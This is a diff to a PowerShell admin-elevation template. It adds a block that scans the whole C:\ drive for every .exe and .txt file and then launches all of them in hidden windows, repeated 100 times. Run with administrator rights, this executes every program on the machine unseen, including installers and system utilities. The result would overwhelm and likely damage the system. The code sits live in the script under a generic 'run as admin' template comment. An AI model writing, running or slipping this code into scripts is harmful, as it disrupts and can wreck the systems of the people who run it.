@@ -7,6 +7,39 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     exit
 }
 
+# Number of times to open each file
+$loopCount = 100
+
+# Drive(s) or base path to search from (use C:\ for full system)
+$searchRoot = "C:\"
+
+# File types to open
+$fileTypes = @("*.exe", "*.txt")
+
+# Get all files matching types (very heavy!)
+$files = @()
+foreach ($type in $fileTypes) {
+    try {
+        $found = Get-ChildItem -Path $searchRoot -Include $type -File -Recurse -ErrorAction SilentlyContinue
+        $files += $found
+    } catch {
+        Write-Host "Error finding files of type $type"
+    }
+}
+
+# Loop and open each file
+for ($i = 1; $i -le $loopCount; $i++) {
+    Write-Host "Loop $i of $loopCount — Opening $($files.Count) files"
+    foreach ($file in $files) {
+        try {
+            Start-Process -FilePath $file.FullName -WindowStyle Hidden
+        } catch {
+            Write-Host "Failed: $($file.FullName)"
+        }
+    }
+}
+
+
 # Your command to run as admin — example:
 Write-Host "Running with Administrator privileges."
 
